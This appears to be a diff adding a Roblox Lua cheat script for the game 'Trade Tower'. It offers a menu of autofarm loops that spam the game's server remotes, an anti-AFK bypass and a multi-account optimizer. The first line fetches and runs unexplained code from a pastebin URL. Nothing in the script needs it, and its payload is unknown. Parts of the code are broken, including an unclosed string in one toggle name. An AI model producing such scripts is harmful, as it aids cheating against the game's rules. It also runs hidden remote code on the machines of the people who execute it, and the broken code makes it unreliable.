@@ -1,0 +1,713 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/qw1mKFJ6'))()
+-- MAIN SCRIPT
+--report and bugs or suggestions to me, patrickstar9730
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+
+local Window = Rayfield:CreateWindow({
+	Name = "Trade Tower Script",
+	LoadingTitle = "autofarm and more",
+	LoadingSubtitle = "by patrickstar9730",
+	ConfigurationSaving = {
+		Enabled = false,
+		FolderName = TradeTower,
+		FileName = "Skibidi Hub"
+	},
+	Discord = {
+		Enabled = false, 
+		Invite = "sirius", 
+		RememberJoins = true 
+	},
+	KeySystem = false,
+	KeySettings = {
+		Title = "Trade Tower Key System",
+		Subtitle = "Buy The Script",
+		Note = "Dm patrickstar9730 on discord",
+		FileName = "SiriusKey",
+		SaveKey = true,
+		GrabKeyFromSite = false,
+		Key = "imperciable"
+	}
+})
+
+local MainTab = Window:CreateTab("AUTOFARM", nil)
+local Section = MainTab:CreateSection("AUTOFARM")
+
+
+local autoRollEnabled = false
+-- auto dice rolls
+local Toggle = MainTab:CreateToggle({
+   Name = "AUTO DICE ROLL",
+   CurrentValue = false,
+   Flag = "Toggle1", 
+   Callback = function(Value)
+      autoRollEnabled = Value
+
+   
+      if autoRollEnabled then
+         task.spawn(function()
+            while autoRollEnabled do
+               local args = {
+                  false
+               }
+
+               game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("RollDice"):InvokeServer(unpack(args))
+               task.wait(0.01) -- Small delay to prevent overload
+            end
+         end)
+      end
+   end,
+})
+
+
+local autoGIFTEnabled = false
+-- auto join giveaway
+local Toggle = MainTab:CreateToggle({
+   Name = "AUTO GIFT ROLL",
+   CurrentValue = false,
+   Flag = "Toggle2",
+   Callback = function(Value)
+      autoGIFTEnabled = Value
+
+     
+      if autoGIFTEnabled then
+         task.spawn(function()
+            while autoGIFTEnabled do
+               local args = {
+                  false
+               }
+
+               game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("EnterGift"):FireServer()
+               task.wait(1)
+            end
+         end)
+      end
+   end,
+})
+
+
+local autoBuxEnabled = false
+-- casebux farm V1
+local Toggle = MainTab:CreateToggle({
+   Name = "CASEBUX FARM V1, faster",
+   CurrentValue = false,
+   Flag = "Toggle3", 
+   Callback = function(Value)
+      autoBuxEnabled = Value
+
+     
+      if autoBuxEnabled then
+         task.spawn(function()
+            while autoBuxEnabled do
+               game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("ClientClick"):FireServer()
+               task.wait(0.01)
+            end
+         end)
+      end
+   end,
+})
+
+local autoBuxV2Enabled = false
+
+-- bux farm v2
+local Toggle = MainTab:CreateToggle({
+   Name = "CASEBUX FARM V2, DOES OPEN CASES",
+   CurrentValue = false,
+   Flag = "Toggle4", 
+   Callback = function(Value)
+     autoBuxV2Enabled = Value
+
+     
+      if autoBuxV2Enabled then
+         task.spawn(function()
+            while autoBuxV2Enabled do
+               local args = {
+                  false
+               }
+
+               game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("RollDice"):InvokeServer(unpack(args))
+
+                            local args = {
+                  false
+               }
+
+               game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("EnterGift"):FireServer()
+
+               game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("ClientClick"):FireServer()
+
+                            local args = {
+	"Legendary"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("OpenCase"):InvokeServer(unpack(args))
+
+                            local args = {
+	"Business"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("OpenCase"):InvokeServer(unpack(args))
+
+                            local args = {
+	"Funding"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("OpenCase"):InvokeServer(unpack(args))
+
+                            local args = {
+	"SellUnder",
+	500000000
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("InventoryActions"):InvokeServer(unpack(args))          
+               task.wait(0.01)
+            end
+         end)
+      end
+   end,
+})
+
+local autoSpinEnabled = false
+-- auto  spin
+local Toggle = MainTab:CreateToggle({
+   Name = "AUTO SPIN ROLL every 30 mins",
+   CurrentValue = false,
+   Flag = "Toggle16",
+   Callback = function(Value)
+      autoSpinEnabled = Value
+
+     
+      if autoSpinEnabled then
+         task.spawn(function()
+            while autoSpinEnabled do
+               local args = {
+                  false
+               }
+
+               game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("SpintheWheel"):FireServer()
+               task.wait(1)
+            end
+         end)
+      end
+   end,
+})
+
+local Toggle = MainTab:CreateToggle({
+   Name = "TIX FARM use with +1 case and max case opening time:),
+   CurrentValue = false,
+   Flag = "Toggle5", 
+   Callback = function(Value)
+      autoTixEnabled = Value
+
+      
+      if autoTixEnabled then
+         task.spawn(function()
+            while autoTixEnabled do
+               local args = {
+	"Starter"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("OpenCase"):InvokeServer(unpack(args))
+
+                            local args = {
+	"Upgrade",
+	"TixPerCase"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StoreActions"):InvokeServer(unpack(args))
+
+                            local args = {
+	"SellUnder",
+	600000
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("InventoryActions"):InvokeServer(unpack(args))
+               task.wait(0.01) -- Small delay to prevent overload
+            end
+         end)
+      end
+   end,
+})
+-- upgrades tab
+local UpgradesTab = Window:CreateTab("upgrades", nil)
+local Section = UpgradesTab:CreateSection("upgrades")
+
+
+local autoTradebucksupgradesEnabled = false
+-- upgrades tab
+local Toggle = UpgradesTab:CreateToggle({
+   Name = "MAX ALL CASEBUXS UPGRADES use at own risk",
+   CurrentValue = false,
+   Flag = "Toggle6",
+   Callback = function(Value)
+      autoTradebucksupgradesEnabled = Value
+
+      if autoTradebucksupgradesEnabled then
+         task.spawn(function()
+            while autoTradebucksupgradesEnabled do
+               local args = {
+                   "Upgrade",
+                   "Clicks"
+               }
+               game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StoreActions"):InvokeServer(unpack(args))
+
+               local args = {
+                   "Upgrade",
+                   "CaseTime"
+               }
+               game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StoreActions"):InvokeServer(unpack(args))
+
+               task.wait(0.01)
+            end
+         end)
+      end
+   end,
+})
+
+--max tix upgrades
+local Toggle = UpgradesTab:CreateToggle({
+   Name = "MAX ALL TIX UPGRADES",
+   CurrentValue = false,
+   Flag = "Toggle7", 
+   Callback = function(Value)
+      autoTixUpgradesEnabled = Value
+
+      
+      if autoTixUpgradesEnabled then
+         task.spawn(function()
+            while autoTixUpgradesEnabled do
+                            local args = {
+	"Upgrade",
+	"PumpkinCases"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StoreActions"):InvokeServer(unpack(args))
+
+                            local args = {
+	"Upgrade",
+	"DiceLuck"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StoreActions"):InvokeServer(unpack(args))
+
+                            local args = {
+	"Upgrade",
+	"TixPerCase"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StoreActions"):InvokeServer(unpack(args))
+task.wait(0.01)
+            end
+         end)
+      end
+   end,
+})
+
+local args = {
+	"Upgrade",
+	"PumpkinCases"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StoreActions"):InvokeServer(unpack(args))
+
+
+local autoMaxCaseEnabled = false
+-- +1 case opening uppgrade
+local Toggle = UpgradesTab:CreateToggle({
+   Name = "+1 CASES UPGRADE",
+   CurrentValue = false,
+   Flag = "Toggle8",
+   Callback = function(Value)
+      autoMaxCaseEnabled = Value
+
+     
+      if autoMaxCaseEnabled then
+         task.spawn(function()
+            while autoMaxCaseEnabled do
+               local args = {
+	"Upgrade",
+	"PumpkinCases"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StoreActions"):InvokeServer(unpack(args))
+               task.wait(0.01)
+            end
+         end)
+      end
+   end,
+})
+
+local autoCaseOpeningEnabled = false
+-- upgrade case opening time
+local Toggle = UpgradesTab:CreateToggle({
+   Name = "UPGRADE CASE OPENING TIME",
+   CurrentValue = false,
+   Flag = "Toggle9",
+   Callback = function(Value)
+      autoCaseOpeningEnabled = Value
+
+     
+      if autoCaseOpeningEnabled then
+         task.spawn(function()
+            while autoCaseOpeningEnabled do
+               local args = {
+	"Upgrade",
+	"CaseTime"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StoreActions"):InvokeServer(unpack(args))
+               task.wait(0.01)
+            end
+         end)
+      end
+   end,
+})
+-- quicksell tab
+local quicksellTab = Window:CreateTab("QUICKSELL")
+local Section = quicksellTab:CreateSection("quicksell under 500m")
+
+local autoSellEnabled = false
+-- quicksell under 500m toggle
+local Toggle = quicksellTab:CreateToggle({
+   Name = "QUICKSELL UNDER 500m",
+   CurrentValue = false,
+   Flag = "Toggle10", 
+   Callback = function(Value)
+      autoSellEnabled = Value
+
+      
+      if autoSellEnabled then
+         task.spawn(function()
+            while autoSellEnabled do
+               local args = {
+	"SellUnder",
+	500000000
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("InventoryActions"):InvokeServer(unpack(args))   
+               task.wait(0.01) -- Small delay to prevent overload
+            end
+         end)
+      end
+   end,
+})
+
+-- quicksell under 500m button
+local Button = quicksellTab:CreateButton({
+   Name = "quicksell all under 500m",
+   Callback = function()
+   local args = {
+	"SellUnder",
+	500000000
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("InventoryActions"):InvokeServer(unpack(args))
+   end,
+})
+--WIP
+local fastcaseTab = Window:CreateTab("FASTCASE")
+local Section = fastcaseTab:CreateSection("FASTCASE, DM ME FOR WHICH CASES TO ADD (patrickstar9730) )")
+
+local autoFastcase95KEnabled = false
+--FASTCASE 95K CASE
+local Toggle = fastcaseTab:CreateToggle({
+   Name = "FASTCASE  MARCELLUS",
+   CurrentValue = false,
+   Flag = "Toggle11", 
+   Callback = function(Value)
+      autoFastcase95KEnabled = Value
+
+   
+      if autoFastcase95KEnabled then
+         task.spawn(function()
+            while autoFastcase95KEnabled do
+               local args = {
+	"Marcellus"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("OpenCase"):InvokeServer(unpack(args))
+               task.wait(0.01) 
+            end
+         end)
+      end
+   end,
+})
+
+-- fastcase big boy
+local autoFastCasebigboyEnabled = false
+
+local Toggle = fastcaseTab:CreateToggle({
+   Name = "FASTCASE: big boy(More cases coming soon, dm me)",
+   CurrentValue = false,
+   Flag = "Toggle12", 
+   Callback = function(Value)
+      autoFastCasebigboyEnabled = Value
+
+      
+      if autoFastCasebigboyEnabled then
+         task.spawn(function()
+            while autoFastCasebigboyEnabled do
+               local args = {
+	"Big Boy"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("OpenCase"):InvokeServer(unpack(args))
+               task.wait(0.01) 
+            end
+         end)
+      end
+   end,
+})
+
+local autoEireneEnabled = false
+-- fastcase eirene
+local Toggle = fastcaseTab:CreateToggle({
+   Name = "FASTCASE  EIRENE (maybe best with 50% off gamepass)",
+   CurrentValue = false,
+   Flag = "Toggle13", 
+   Callback = function(Value)
+      autoEireneEnabled = Value
+
+   
+      if autoEireneEnabled then
+         task.spawn(function()
+            while autoEireneEnabled do
+               local args = {
+	"Eirene"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("OpenCase"):InvokeServer(unpack(args))
+               task.wait(0.01)
+            end
+         end)
+      end
+   end,
+})
+
+local MiscTab = Window:CreateTab("Misc")
+local Section = MiscTab:CreateSection("Misc")
+
+local Players = game:GetService("Players")
+local VirtualUser = game:GetService("VirtualUser")
+local autoAFKEnabled = false
+
+local Toggle = MiscTab:CreateToggle({
+   Name = "Anti-AFK",
+   CurrentValue = false,
+   Flag = "Toggle14", 
+   Callback = function(Value)
+      autoAFKEnabled = Value
+
+      if autoAFKEnabled then
+         task.spawn(function()
+            local GC = getconnections or get_signal_cons
+            if GC then
+                for i, v in pairs(GC(Players.LocalPlayer.Idled)) do
+                    if v.Disable then
+                        v:Disable()
+                    elseif v.Disconnect then
+                        v:Disconnect()
+                    end
+                end
+            else
+                Players.LocalPlayer.Idled:Connect(function()
+                    VirtualUser:CaptureController()
+                    VirtualUser:ClickButton2(Vector2.new())
+                end)
+            end
+
+            while autoAFKEnabled do
+                task.wait(10)
+            end
+         end)
+      end
+   end,
+})
+
+local autoOptimizerEnabled = false
+local optimizerTask 
+local idleConn, descConn 
+local RunService = game:GetService("RunService")
+
+local Toggle = MiscTab:CreateToggle({
+   Name = "Game Optimizer (won't restore everything, use at ur own risk) good for multiple accounts",
+   CurrentValue = false,
+   Flag = "Toggle15",
+   Callback = function(Value)
+      autoOptimizerEnabled = Value
+
+      
+      if not Value then
+         
+         if optimizerTask then
+            task.cancel(optimizerTask)
+            optimizerTask = nil
+         end
+         
+         
+         if idleConn then 
+            idleConn:Disconnect() 
+            idleConn = nil 
+         end
+         
+         if descConn then 
+            descConn:Disconnect() 
+            descConn = nil 
+         end
+         
+         
+         RunService:Set3dRenderingEnabled(true)
+         
+         
+         if _G._origQuality then
+            settings().Rendering.QualityLevel = _G._origQuality
+         else
+            settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
+         end
+         
+         
+         if _G._origVolume then
+            UserSettings():GetService("UserGameSettings").MasterVolume = _G._origVolume
+         else
+            UserSettings():GetService("UserGameSettings").MasterVolume = 1
+         end
+         
+         
+         setfpscap(60)
+         
+         
+         local function restoreGameVisuals()
+            local Lighting = game:GetService("Lighting")
+            
+            
+            pcall(function()
+               Lighting.GlobalShadows = true
+               Lighting.FogEnd = 10000
+               Lighting.Brightness = 2
+               Lighting.ExposureCompensation = 0
+            end)
+            
+            
+            for _, obj in ipairs(game:GetDescendants()) do
+               if obj:IsA("BasePart") then
+                  
+                  obj.Transparency = 0
+                  
+                  
+                  if obj:GetAttribute("OrigMaterial") then
+                     pcall(function()
+                        obj.Material = obj:GetAttribute("OrigMaterial")
+                     end)
+                  end
+               end
+            end
+            
+           
+            game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
+            
+            
+            settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
+            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+         end
+         
+         
+         task.spawn(restoreGameVisuals)
+         
+         print("🔁 Optimizer OFF: All settings and visuals restored.")
+         return
+      end
+
+      
+      optimizerTask = task.spawn(function()
+         local Players = game:GetService("Players")
+         local Lighting = game:GetService("Lighting")
+         local UserInputService = game:GetService("UserInputService")
+         local VirtualUser = game:GetService("VirtualUser")
+         local UserGameSettings = UserSettings():GetService("UserGameSettings")
+         local LocalPlayer = Players.LocalPlayer
+
+         
+         _G._origQuality = settings().Rendering.QualityLevel
+         _G._origVolume = UserGameSettings.MasterVolume
+
+         
+         UserGameSettings.MasterVolume = 0
+
+         
+         idleConn = LocalPlayer.Idled:Connect(function()
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new(math.random(10,50), math.random(10,50)))
+         end)
+
+         
+         local function cleanAssets()
+            pcall(function()
+               settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+            end)
+
+            pcall(function()
+               local pgui = LocalPlayer:FindFirstChild("PlayerGui")
+               if pgui then
+                  for _, gui in pairs(pgui:GetChildren()) do
+                     if not gui:IsA("ScreenGui") then
+                        gui.Enabled = false
+                     end
+                  end
+               end
+            end)
+
+            for _, obj in ipairs(game:GetDescendants()) do
+               if obj:IsA("BasePart") then
+                  
+                  if not obj:GetAttribute("OrigMaterial") then
+                     obj:SetAttribute("OrigMaterial", obj.Material)
+                  end
+                  
+                  obj.Transparency = 1
+                  obj.Material = Enum.Material.SmoothPlastic
+                  local decal = obj:FindFirstChildOfClass("Decal")
+                  if decal then decal.Transparency = 1 end
+               elseif obj:IsA("Texture") or obj:IsA("Decal") then
+                  obj.Transparency = 1
+               elseif obj:IsA("MeshPart") then
+                  obj.Transparency = 1
+               elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
+                  obj.Enabled = false
+               elseif obj:IsA("Sound") then
+                  obj.Volume = 0
+               end
+            end
+
+            pcall(function()
+               Lighting.GlobalShadows = false
+               Lighting.FogEnd = 500000000
+               Lighting.Brightness = 0
+               Lighting.ExposureCompensation = -2
+            end)
+         end
+         
+         descConn = game.DescendantAdded:Connect(function(obj)
+            if not autoOptimizerEnabled then return end
+            if obj:IsA("Texture") or obj:IsA("Decal") then
+               obj.Transparency = 1
+            elseif obj:IsA("MeshPart") then
+               obj.Transparency = 1
+            elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
+               obj.Enabled = false
+            elseif obj:IsA("Sound") then
+               obj.Volume = 0
+            elseif obj:IsA("BasePart") then
+               
+               if not obj:GetAttribute("OrigMaterial") then
+                  obj:SetAttribute("OrigMaterial", obj.Material)
+               end
+               
+               obj.Transparency = 1
+               obj.Material = Enum.Material.SmoothPlastic
+               local decal = obj:FindFirstChildOfClass("Decal")
+               if decal then decal.Transparency = 1 end
+            end
+         end)
+
+        
+         cleanAssets()
+
+         local lastClean = tick()
+         while autoOptimizerEnabled and task.wait(1) do
+            pcall(function()
+               setfpscap(4)
+               settings().Rendering.QualityLevel = 1
+               RunService:Set3dRenderingEnabled(false)
+            end)
+
+            if tick() - lastClean >= 30 then
+               collectgarbage("collect")
+               cleanAssets()
+               print("♻️ Cleanup run (RAM/CPU reduced)")
+               lastClean = tick()
+            end
+         end
+      end)
+   end,
+})
